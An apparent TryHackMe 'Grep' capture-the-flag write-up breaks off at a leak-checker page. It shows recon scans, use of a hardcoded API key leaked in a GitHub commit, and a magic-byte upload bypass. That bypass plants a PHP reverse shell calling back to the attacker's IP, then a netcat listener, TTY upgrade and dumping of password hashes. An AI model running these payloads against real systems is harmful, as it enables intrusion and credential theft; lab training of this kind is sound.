----
A challenge that tests your reconnaissance and OSINT skills.
----

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/6fadc47083720793a8edb44e29840aa4.png)

### Task 1  Grep

 Start Machine

Welcome to the OSINT challenge, part of TryHackMe’s Red Teaming Path. In this task, you will be an ethical hacker aiming to exploit a newly developed web application.

SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.

Start by deploying the machine; Click on the `Start Machine` button in the upper-right-hand corner of this task to deploy the virtual machine for this room.

Your goal is to identify and exploit vulnerabilities in the application using a combination of recon and OSINT skills. As you progress, you’ll look for weak points in the app, find sensitive data, and attempt to gain unauthorized access. You will leverage the skills and knowledge acquired through the Red Team Pathway to devise and execute your attack strategies.

**Note:** Please allow the machine 3 - 5 minutes to fully boot. Also, no local privilege escalation is necessary to answer the questions.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.78.9 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.78.9:22
Open 10.10.78.9:80
Open 10.10.78.9:443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 13:18 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:18
Completed Parallel DNS resolution of 1 host. at 13:18, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:18
Scanning 10.10.78.9 [3 ports]
Discovered open port 443/tcp on 10.10.78.9
Discovered open port 22/tcp on 10.10.78.9
Discovered open port 80/tcp on 10.10.78.9
Completed Connect Scan at 13:18, 0.22s elapsed (3 total ports)
Initiating Service scan at 13:18
Scanning 3 services on 10.10.78.9
Completed Service scan at 13:18, 13.04s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.78.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 8.71s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 2.43s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.01s elapsed
Nmap scan report for 10.10.78.9
Host is up, received user-set (0.22s latency).
Scanned at 2023-08-20 13:18:26 EDT for 25s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7b:7d:b9:79:3a:5a:27:35:a8:8a:96:fe:a6:45:77:de (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzyp8voMZUJfpIZMKR8fULuwu9/R/krbDTotgQsjVxzsmDX6HVoqUejoCiGDH2QgQqNa9rjEH+z2qnBLZz72KNCvd5O4aNUm/sQgh6HtaAR90iMHP0bm/VydbRqytqSZ9zxj1/Nqqd9GhVKhPM0xT0X3Hyl9/F+JhBHLdH6vahdK1DAnz6gZiyrZo+cxtS7WUyUlIO2yg9kAowYsaT5NPiWeHVY0+oCFAp4U9m78JylgteWAVFxQhBECWdjpJz/mzQmA0LgWMrFNDLDBJj3b+wAD9a0aZNlslZYaXFUi8UnFWcfQ5/RoX8zlmKvK167y5+1pbzNJEpOkepGKdcpTM3wE6bTF5fMETJior9BewEG13ubeuavuessMqW56cT71fTrljDLjaSmc+77CeTdsReNSr45bFDLyGD4LLJyKSOsvTmFApLcEqkVg/ZXZlE0BjxKYuSgcrTJtmNzxDmnokwfkslfXw32rz6Nte9+dJDbTsD1NLZ8zJ4Ow9C3hWTME0=
|   256 ce:e0:22:b2:5e:9e:d9:d6:89:8f:1e:57:05:9c:1e:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDB3efwkSzkUT4rmJbvIRhmgZXfo+aT7s0HQpVqSALyDIOYff1DKbjZe6jTAoYi8AVM1UpCLLXhezGV2MTGbk/0=
|   256 49:ec:11:94:eb:c9:9c:51:08:6c:b1:3f:b3:21:b7:f8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHFft6V62ZnvwTNCW5o3aVcHvVBbsWY/CM82QMPfHzFt
80/tcp  open  http     syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  ssl/http syn-ack Apache httpd 2.4.41
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.41 (Ubuntu)
| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Issuer: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-14T13:03:09
| Not valid after:  2024-06-13T13:03:09
| MD5:   7295:8ef0:7c16:221c:3b0a:40ee:913c:766c
| SHA-1: 38c2:3ba3:34b1:851a:f1d4:ee0a:37bd:701a:830c:7dd8
| -----BEGIN CERTIFICATE-----
| MIIDFzCCAf8CFGTWwbbVKaNSN8fhUdtf0QT84zCSMA0GCSqGSIb3DQEBCwUAMEgx
| CzAJBgNVBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0YXRlMREwDwYDVQQKDAhTZWFy
| Y2hNRTERMA8GA1UEAwwIZ3JlcC50aG0wHhcNMjMwNjE0MTMwMzA5WhcNMjQwNjEz
| MTMwMzA5WjBIMQswCQYDVQQGEwJVUzETMBEGA1UECAwKU29tZS1TdGF0ZTERMA8G
| A1UECgwIU2VhcmNoTUUxETAPBgNVBAMMCGdyZXAudGhtMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAtiDNwwY9IR2HADMy6CRAwiPH0s8dIOFGPrbYCbLz
| fDKIWURlczzOlmgpscN/YHHpt6P5ywUPLGnMK3ukYag7xTUYl+vmledTnD9oebnJ
| 6qDweFFwdZ8hysITyvCyGgqcY52JE2nBtVNj6/L16iZ60KKko8opNsTE5IYj/sUt
| PsOxeNiV3oqpOUeKtZJbn7Kssd4KBwnRqTSUlXlPXzeRipAiW5SZZXo6K4YeLVht
| XlLPtPWsMC0fj16DDDtxLlZmvu3J5o9egp/eRpWmvKWIaKQ57Y0MKB8/gso8FxxX
| NiRY9Nru0C3DCUbc/xXywQ9pIGt/Xir++aXhyxCiIGh22QIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCzhJu52dIY7V/qQleDMEQ1oBLrQoFhHD6+UbvH0ELMAtL5Dc8A
| LGDdyFkgsx04TaZtJ20dyrjYD+tcAgu9Yb7eEYbfqqD5w4XSzvdEuTW2aVL86aT6
| IBbN8SMkX2zfILjHTOR1F7WAoHaIssH0yZltg+lQEEnAeb+XoIZm9cIW2bTNKoO2
| MeHgvSKkQkjROO29XQQ3mTbxFG86UsTwyGHdddnkfiWilXqgfh+wGxbY/wCdhU0C
| TnuXn4IEVdCBn16rCg51kEZZC1EWPcJpv0/InUNfcgumcVY033EXF/HgW4eNDD6H
| XmLEGKfScUWcO0//STDZGZXwf9gt30DqoMSf
|_-----END CERTIFICATE-----
|_http-title: 403 Forbidden
Service Info: Host: ip-10-10-78-9.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.56 seconds

POST / HTTP/1.1

Host: 10.10.78.9

HTTP/1.1 403 Forbidden

Date: Sun, 20 Aug 2023 17:22:30 GMT

just through port 80

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.78.9/ -i200,301,302,401 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/witty/.dirsearch/reports/10.10.78.9/-_23-08-20_13-24-03.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-08-20_13-24-03.log

Target: http://10.10.78.9/

[13:24:03] Starting: 
[13:25:14] 200 -   11KB - /index.php
[13:25:15] 200 -   11KB - /index.php/login/
[13:25:17] 301 -  313B  - /javascript  ->  http://10.10.78.9/javascript/

Task Completed

maybe we can bypass 403

view certificate

Organization : SearchME
Common Name : grep.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts       
10.10.78.9 grep.thm

oops I forgot the port 51337

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.78.9 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.78.9:22
Open 10.10.78.9:80
Open 10.10.78.9:443
Open 10.10.78.9:51337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 13:38 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Initiating Connect Scan at 13:38
Scanning grep.thm (10.10.78.9) [4 ports]
Discovered open port 22/tcp on 10.10.78.9
Discovered open port 51337/tcp on 10.10.78.9
Discovered open port 80/tcp on 10.10.78.9
Discovered open port 443/tcp on 10.10.78.9
Completed Connect Scan at 13:38, 0.23s elapsed (4 total ports)
Initiating Service scan at 13:38
Scanning 4 services on grep.thm (10.10.78.9)
Completed Service scan at 13:38, 13.09s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.78.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 11.71s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 2.38s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.01s elapsed
Nmap scan report for grep.thm (10.10.78.9)
Host is up, received user-set (0.23s latency).
Scanned at 2023-08-20 13:38:31 EDT for 28s

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7b:7d:b9:79:3a:5a:27:35:a8:8a:96:fe:a6:45:77:de (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzyp8voMZUJfpIZMKR8fULuwu9/R/krbDTotgQsjVxzsmDX6HVoqUejoCiGDH2QgQqNa9rjEH+z2qnBLZz72KNCvd5O4aNUm/sQgh6HtaAR90iMHP0bm/VydbRqytqSZ9zxj1/Nqqd9GhVKhPM0xT0X3Hyl9/F+JhBHLdH6vahdK1DAnz6gZiyrZo+cxtS7WUyUlIO2yg9kAowYsaT5NPiWeHVY0+oCFAp4U9m78JylgteWAVFxQhBECWdjpJz/mzQmA0LgWMrFNDLDBJj3b+wAD9a0aZNlslZYaXFUi8UnFWcfQ5/RoX8zlmKvK167y5+1pbzNJEpOkepGKdcpTM3wE6bTF5fMETJior9BewEG13ubeuavuessMqW56cT71fTrljDLjaSmc+77CeTdsReNSr45bFDLyGD4LLJyKSOsvTmFApLcEqkVg/ZXZlE0BjxKYuSgcrTJtmNzxDmnokwfkslfXw32rz6Nte9+dJDbTsD1NLZ8zJ4Ow9C3hWTME0=
|   256 ce:e0:22:b2:5e:9e:d9:d6:89:8f:1e:57:05:9c:1e:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDB3efwkSzkUT4rmJbvIRhmgZXfo+aT7s0HQpVqSALyDIOYff1DKbjZe6jTAoYi8AVM1UpCLLXhezGV2MTGbk/0=
|   256 49:ec:11:94:eb:c9:9c:51:08:6c:b1:3f:b3:21:b7:f8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHFft6V62ZnvwTNCW5o3aVcHvVBbsWY/CM82QMPfHzFt
80/tcp    open  http     syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp   open  ssl/http syn-ack Apache httpd 2.4.41
|_ssl-date: TLS randomness does not represent time
| http-title: Welcome
|_Requested resource was /public/html/
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Issuer: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-14T13:03:09
| Not valid after:  2024-06-13T13:03:09
| MD5:   7295:8ef0:7c16:221c:3b0a:40ee:913c:766c
| SHA-1: 38c2:3ba3:34b1:851a:f1d4:ee0a:37bd:701a:830c:7dd8
| -----BEGIN CERTIFICATE-----
| MIIDFzCCAf8CFGTWwbbVKaNSN8fhUdtf0QT84zCSMA0GCSqGSIb3DQEBCwUAMEgx
| CzAJBgNVBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0YXRlMREwDwYDVQQKDAhTZWFy
| Y2hNRTERMA8GA1UEAwwIZ3JlcC50aG0wHhcNMjMwNjE0MTMwMzA5WhcNMjQwNjEz
| MTMwMzA5WjBIMQswCQYDVQQGEwJVUzETMBEGA1UECAwKU29tZS1TdGF0ZTERMA8G
| A1UECgwIU2VhcmNoTUUxETAPBgNVBAMMCGdyZXAudGhtMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAtiDNwwY9IR2HADMy6CRAwiPH0s8dIOFGPrbYCbLz
| fDKIWURlczzOlmgpscN/YHHpt6P5ywUPLGnMK3ukYag7xTUYl+vmledTnD9oebnJ
| 6qDweFFwdZ8hysITyvCyGgqcY52JE2nBtVNj6/L16iZ60KKko8opNsTE5IYj/sUt
| PsOxeNiV3oqpOUeKtZJbn7Kssd4KBwnRqTSUlXlPXzeRipAiW5SZZXo6K4YeLVht
| XlLPtPWsMC0fj16DDDtxLlZmvu3J5o9egp/eRpWmvKWIaKQ57Y0MKB8/gso8FxxX
| NiRY9Nru0C3DCUbc/xXywQ9pIGt/Xir++aXhyxCiIGh22QIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCzhJu52dIY7V/qQleDMEQ1oBLrQoFhHD6+UbvH0ELMAtL5Dc8A
| LGDdyFkgsx04TaZtJ20dyrjYD+tcAgu9Yb7eEYbfqqD5w4XSzvdEuTW2aVL86aT6
| IBbN8SMkX2zfILjHTOR1F7WAoHaIssH0yZltg+lQEEnAeb+XoIZm9cIW2bTNKoO2
| MeHgvSKkQkjROO29XQQ3mTbxFG86UsTwyGHdddnkfiWilXqgfh+wGxbY/wCdhU0C
| TnuXn4IEVdCBn16rCg51kEZZC1EWPcJpv0/InUNfcgumcVY033EXF/HgW4eNDD6H
| XmLEGKfScUWcO0//STDZGZXwf9gt30DqoMSf
|_-----END CERTIFICATE-----
51337/tcp open  http     syn-ack Apache httpd 2.4.41
|_http-title: 400 Bad Request
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: ip-10-10-78-9.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.14 seconds

https://10.10.78.9:51337/

Common Name : leakchecker.grep.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.78.9 grep.thm leakchecker.grep.thm

https://grep.thm/public/html/

register

Invalid or Expired API key

OSINT

https://github.com/search?q=SearchMEcms&type=code

https://github.com/supersecuredeveloper/searchmecms

register.php

<?php
require_once 'config.php';
header('Content-Type: application/json');

$headers = apache_request_headers();

if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {
    $input = json_decode(file_get_contents('php://input'), true);

    $stmt = $mysqli->prepare("INSERT INTO users (username, password, email, name) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("ssss", $input['username'], password_hash($input['password'], PASSWORD_DEFAULT), $input['email'], $input['name']);

    if ($stmt->execute()) {
        echo json_encode(['message' => 'Registration successful.']);
    } else {
        echo json_encode(['error' => 'Registration failed: ' . $stmt->error]);
    }
    $stmt->close();
} else {
    echo json_encode(array('error' => 'Invalid or Expired API key'));
  }

?>

upload.php

<?php
session_start();
require 'config.php';
$uploadPath = 'uploads/';

function checkMagicBytes($fileTmpPath, $validMagicBytes) {
    $fileMagicBytes = file_get_contents($fileTmpPath, false, null, 0, 4);
    return in_array(bin2hex($fileMagicBytes), $validMagicBytes);
}

$allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp'];
$validMagicBytes = [
    'jpg' => 'ffd8ffe0', 
    'png' => '89504e47', 
    'bmp' => '424d'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_SESSION['username'])) {
        if (isset($_FILES['file'])) {
            $file = $_FILES['file'];
            $fileName = $file['name'];
            $fileTmpPath = $file['tmp_name'];
            $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

            if (checkMagicBytes($fileTmpPath, $validMagicBytes)) {
                $uploadDestination = $uploadPath . $fileName;
                move_uploaded_file($fileTmpPath, $uploadDestination);

                echo json_encode(['message' => 'File uploaded successfully.']);
            } else {
                echo json_encode(['error' => 'Invalid file type. Only JPG, JPEG, PNG, and BMP files are allowed.']);
            }
        } else {
            echo json_encode(['error' => 'No file uploaded.']);
        }
    } else {
        echo json_encode(['error' => 'User not logged in.']);
    }
} else {
    echo json_encode(['error' => 'Unsupported request method.']);
}
?>

commits

https://github.com/supersecuredeveloper/searchmecms/commit/db11421db2324ed0991c36493a725bf7db9bdcf6

|   |
|---|
|$headers = apache_request_headers();|
||||
|||if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'ffe60ecaa8bba2f12b43d1a4b15b8f39') {|
|||if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {|


POST /api/register.php HTTP/1.1

Host: grep.thm

Cookie: PHPSESSID=joctp902ajsb4qu5orldilonaj

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://grep.thm/public/html/register.php

Content-Type: application/json

X-Thm-Api-Key: ffe60ecaa8bba2f12b43d1a4b15b8f39

Origin: https://grep.thm

Content-Length: 76

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Te: trailers

Connection: close



{"username":"test","password":"test","email":"test@gmail.com","name":"test"}


HTTP/1.1 200 OK

Date: Sun, 20 Aug 2023 18:15:25 GMT

Server: Apache/2.4.41 (Ubuntu)

Content-Length: 38

Connection: close

Content-Type: application/json



{"message":"Registration successful."}

then login

First Flag

THM{4ec9806d7e1350270dc402ba870ccebb}

POST /api/upload.php HTTP/1.1

{"error":"No file uploaded."}

https://grep.thm/api/uploads/

https://grep.thm/public/html/upload.php

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>  

{"error":"Invalid file type. Only JPG, JPEG, PNG, and BMP files are allowed."}

┌──(witty㉿kali)-[~/Downloads]
└─$ cp payload_monkey.php payload_monkey.php.jpg

──(witty㉿kali)-[~/Downloads]
└─$ head payload_monkey.php.jpg 
AAAA
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.19.103';
$port = 4444;
$chunk_size = 1400;

$allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp'];
$validMagicBytes = [
    'jpg' => 'ffd8ffe0', 
    'png' => '89504e47', 
    'bmp' => '424d'
];

hexeditor

00000000  FF D8 FF E0  0A 3C 3F 70   68 70 0A 2F  2F 20 70 68     .....

┌──(witty㉿kali)-[~/Downloads]
└─$ hexeditor payload_monkey.php.jpg 
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ xxd payload_monkey.php.jpg
00000000: ffd8 ffe0 0a3c 3f70 6870 0a2f 2f20 7068  .....

┌──(witty㉿kali)-[~/Downloads]
└─$ mv payload_monkey.php.jpg payload_monkey_test.php


{"message":"File uploaded successfully."}

https://grep.thm/api/uploads/

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.78.9] 56996
Linux ip-10-10-78-9 5.15.0-1038-aws #43~20.04.1-Ubuntu SMP Fri Jun 2 17:10:57 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 19:45:53 up  2:49,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@ip-10-10-78-9:/$ ls
ls
bin   dev  home  lib32	libx32	    media  opt	 root  sbin  srv  tmp  var
boot  etc  lib	 lib64	lost+found  mnt    proc  run   snap  sys  usr
www-data@ip-10-10-78-9:/$ cd /home
cd /home
www-data@ip-10-10-78-9:/home$ ls
ls
tryhackme  ubuntu
www-data@ip-10-10-78-9:/home$ cd tryhackme
cd tryhackme
www-data@ip-10-10-78-9:/home/tryhackme$ ls
ls
www-data@ip-10-10-78-9:/home/tryhackme$ ls -lah
ls -lah
total 24K
drwxr-xr-x 3 tryhackme tryhackme 4.0K Jun 29 08:05 .
drwxr-xr-x 4 root      root      4.0K Nov 10  2021 ..
lrwxrwxrwx 1 root      root         9 Nov 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 tryhackme tryhackme  220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 tryhackme tryhackme 3.7K Nov 10  2021 .bashrc
drwx------ 2 tryhackme tryhackme 4.0K Jun 29 08:05 .cache
-rw-r--r-- 1 tryhackme tryhackme  807 Nov 10  2021 .profile
www-data@ip-10-10-78-9:/home/tryhackme$ cd /var/www
cd /var/www
www-data@ip-10-10-78-9:/var/www$ ls
ls
backup		 html		       private.key
certificate.crt  leak_certificate.crt  private_unencrypted.key
certificate.csr  leak_certificate.csr
default_html	 leakchecker
www-data@ip-10-10-78-9:/var/www$ cd backup
cd backup
www-data@ip-10-10-78-9:/var/www/backup$ ls
ls
users.sql
www-data@ip-10-10-78-9:/var/www/backup$ cat users.sql
cat users.sql
-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: May 30, 2023 at 01:25 PM
-- Server version: 10.4.28-MariaDB
-- PHP Version: 8.0.28

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `postman`
--

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `email` varchar(100) NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `role` varchar(20) DEFAULT 'user'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES
(1, 'test', '$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G', 'test@grep.thm', 'Test User', 'user'),
(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`),
  ADD UNIQUE KEY `email` (`email`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;

www-data@ip-10-10-78-9:/var/www$ ls
ls
backup		 html		       private.key
certificate.crt  leak_certificate.crt  private_unencrypted.key
certificate.csr  leak_certificate.csr
default_html	 leakchecker
www-data@ip-10-10-78-9:/var/www$ cd leakchecker
cd leakchecker
www-data@ip-10-10-78-9:/var/www/leakchecker$ ls
ls
check_email.php  index.php
www-data@ip-10-10-78-9:/var/www/leakchecker$ cat index.php
cat index.php
cat: index.php: Permission denied
www-data@ip-10-10-78-9:/var/www/leakchecker$ cat check_email.php
cat check_email.php
cat: check_email.php: Permission denied

https://leakchecker.grep.thm:51337/

Email Leak Checker
Email: admin@searchme2023cms.grep.thm
